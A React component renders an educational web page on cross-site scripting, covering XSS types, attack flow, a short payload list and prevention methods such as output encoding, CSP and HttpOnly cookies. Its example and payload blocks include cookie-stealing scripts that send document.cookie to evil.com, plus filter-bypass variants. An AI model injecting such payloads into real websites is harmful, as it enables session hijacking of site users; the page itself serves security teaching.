import React from "react";

const XSS: React.FC = () => (
  <div className="p-8 space-y-8 rounded-xl shadow-lg mt-20">
    <h1 className="text-4xl font-extrabold border-b-2 pb-2">
      Cross-Site Scripting (XSS)
    </h1>
    <p className="text-sm text-gray-500">Last Updated: 16 Jan, 2026</p>

    <p className="text-lg leading-relaxed">
      Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious
      scripts into web pages viewed by other users. These scripts can steal session cookies,
      redirect users, or modify page content.
    </p>

    <h2 className="text-3xl font-bold mt-8">Types of XSS</h2>
    <div className="overflow-x-auto mt-4">
      <table className="min-w-full border border-gray-300 text-left">
        <thead className="bg-gray-200">
          <tr>
            <th className="p-3 border">Type</th>
            <th className="p-3 border">Storage</th>
            <th className="p-3 border">Description</th>
          </tr>
        </thead>
        <tbody className="bg-white text-gray-900">
          <tr>
            <td className="p-3 border font-semibold">Stored XSS</td>
            <td className="p-3 border">Server database</td>
            <td className="p-3 border">Payload stored, affects all viewers</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">Reflected XSS</td>
            <td className="p-3 border">URL/request</td>
            <td className="p-3 border">Payload in link, one-time execution</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">DOM-based XSS</td>
            <td className="p-3 border">Client-side</td>
            <td className="p-3 border">Payload processed by JavaScript</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 className="text-3xl font-bold mt-8">How XSS Works</h2>
    <div className="bg-gray-100 text-gray-900 p-6 rounded-lg mt-4 font-mono text-sm text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Stored XSS Example:

1. Attacker posts comment:
   <script>document.location='http://evil.com/steal?c='+document.cookie</script>

2. Comment stored in database

3. Victim views page with comments

4. Malicious script executes in victim's browser

5. Victim's cookies sent to attacker

Reflected XSS Example:
http://site.com/search?q=<script>alert('XSS')</script>

Server reflects the input back:
<p>Results for: <script>alert('XSS')</script></p>`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Common XSS Payloads</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`Basic Alert:
<script>alert('XSS')</script>

Cookie Stealing:
<script>new Image().src="http://evil.com/steal?c="+document.cookie</script>

Event Handlers:
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">

Encoded Payloads:
<script>alert(String.fromCharCode(88,83,83))</script>

Bypassing Filters:
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert('XSS')</script >`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Prevention Methods</h2>
    <div className="bg-gray-100 text-gray-900 p-4 rounded-lg mt-4 font-mono text-gray-900">
      <pre className="whitespace-pre-wrap text-gray-900">
{`1. OUTPUT ENCODING
   Encode data based on context:
   - HTML: &lt; &gt; &amp; &quot;
   - JavaScript: \\xHH escaping
   - URL: %HH encoding

2. INPUT VALIDATION
   - Whitelist allowed characters
   - Validate data type and format
   - Reject or sanitize dangerous input

3. CONTENT SECURITY POLICY (CSP)
   Content-Security-Policy: script-src 'self'

   Prevents inline scripts and external sources

4. HTTPONLY COOKIES
   Set-Cookie: session=abc; HttpOnly

   Prevents JavaScript access to cookies

5. USE SECURE FRAMEWORKS
   - React: auto-escapes by default
   - Angular: sanitizes automatically`}
      </pre>
    </div>

    <h2 className="text-3xl font-bold mt-8">Context-Aware Encoding</h2>
    <div className="overflow-x-auto mt-4">
      <table className="min-w-full border border-gray-300 text-left">
        <thead className="bg-gray-200">
          <tr>
            <th className="p-3 border">Context</th>
            <th className="p-3 border">Encoding</th>
            <th className="p-3 border">Example</th>
          </tr>
        </thead>
        <tbody className="bg-white text-gray-900">
          <tr>
            <td className="p-3 border font-semibold">HTML Body</td>
            <td className="p-3 border">HTML entity encode</td>
            <td className="p-3 border">{`& -> &amp;`}</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">HTML Attribute</td>
            <td className="p-3 border">Attribute encode</td>
            <td className="p-3 border">{`" -> &quot;`}</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">JavaScript</td>
            <td className="p-3 border">JavaScript encode</td>
            <td className="p-3 border">{`' -> \\x27`}</td>
          </tr>
          <tr>
            <td className="p-3 border font-semibold">URL</td>
            <td className="p-3 border">URL encode</td>
            <td className="p-3 border">{`< -> %3C`}</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h2 className="text-3xl font-bold mt-8">Key Points to Remember</h2>
    <div className="bg-yellow-50 dark:bg-yellow-900/20 p-4 rounded-lg mt-4">
      <ul className="list-disc list-inside leading-relaxed space-y-2">
        <li>Always encode output based on context</li>
        <li>Stored XSS is more dangerous than reflected</li>
        <li>Implement Content Security Policy (CSP)</li>
        <li>Use HttpOnly flag for session cookies</li>
        <li>Modern frameworks help prevent XSS but are not foolproof</li>
        <li>Validate input and encode output - defense in depth</li>
      </ul>
    </div>
  </div>
);

export default XSS;
